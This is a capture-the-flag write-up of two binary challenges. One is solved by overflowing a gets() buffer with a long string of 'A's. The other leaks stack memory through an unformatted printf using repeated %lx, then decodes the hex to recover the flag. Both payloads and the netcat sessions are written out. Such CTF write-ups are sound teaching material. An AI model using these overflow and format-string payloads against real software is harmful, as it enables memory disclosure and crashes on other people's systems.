# The baker 1
It's a simple buffer overflow challenge, the first input has gets() which can be seen on reversing the binary. Overflow to get the flag.
``
```bash
$ nc rvcechalls.xyz 24695
Help Anna bake a cake
Does Anna need butter?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag{Am4zingB4k3s_Am4zingCak35}
```

# The baker 2
It's a format string vulnerability challenge.

```C
void vulnerable(void)

{
  char local_108 [256];
  
  printf("What do you want today?\n1.Cake\n2.Cheesecake\n3.Croissant\n4.cookies\n5.bread? ");
  fflush(stdout);
  fgets(local_108,0x100,stdin);
  printf(local_108);
  putchar(10);
  return;
}
```

on reversing in ghidra, we see that there is no format specifier for the print statement. It'll print whatever we give as input. On inputting a bunch of %lx to print out contents of the stack-
```bash
nc rvcechalls.xyz 24692
Welcome to Anna's bakery!
What do you want today?
1.Cake
2.Cheesecake
3.Croissant
4.cookies
5.bread? 
%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx%lx
57c6bdd7e491fbad20880057c6bdd7e4906c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c2525786c25786c2578786c25786c25786c6c25786c25786c25786c25786c25787ffecb0c0cf057c6bd2862c3316c737b67616c667d5373696c623363a04084000100000000055000000067000280000000000000060000001157c6bd2850407d0d5350383ce307ffecb0c0fe97ffecb127000101010000002178bfbff7ffecb0c0ff964100057c6bd2860d017d0d532e0d90057c6bd2862901cb0c0df07ffecb0c0e080193b7934c4e9c26e
```
this looks like hex
on doing from hex on cyberchef we get
```bash
xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%%xl%xl%xxl%xl%xll%xl%xl%xl%xl%(bÃ1ls{galf}Ssilb3c
```
`1ls{galf}Ssilb3c` looks like the flag, we need to reverse (because stack) every 8 characters (because long).

`flag{sl1c3blisS}`
